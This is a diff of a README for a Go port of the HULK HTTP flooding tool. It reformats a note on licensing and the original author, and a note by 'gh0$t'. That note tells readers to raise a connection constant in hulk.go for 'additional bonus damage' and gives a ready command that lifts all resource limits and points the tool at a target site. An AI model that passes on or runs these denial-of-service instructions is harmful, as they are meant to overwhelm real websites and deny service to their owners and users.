@@ -39,7 +39,10 @@ I have choose GPL for it. Okey. So, Go version of HULK licensed under GPLv3. See
 
 I am not related with original HULK utility in Python. Original HULK utility is authority of Barry Shteiman (http://sectorix.com). There are not any references to license in the original source then it is not under GPL. Ask author of the original utility about license. 
  
-**Note by gh0$t :** Search for **1023** inside **hulk.go** and replace it with **10240**, then run the script like the following for additional bonus damage:
+Note by gh0$t
+=======
+
+Search for **1023** inside **hulk.go** and replace it with **10240**, then run the script like the following for additional bonus damage:
 ```
 ulimit -t unlimited; ulimit -f unlimited; ulimit -m unlimited; ulimit -u unlimited; ulimit -n 10000000000; ulimit -s unlimited; ulimit -v unlimited; go run hulk.go -site http://Your.Target.Site.com 2>/dev/null
 ```
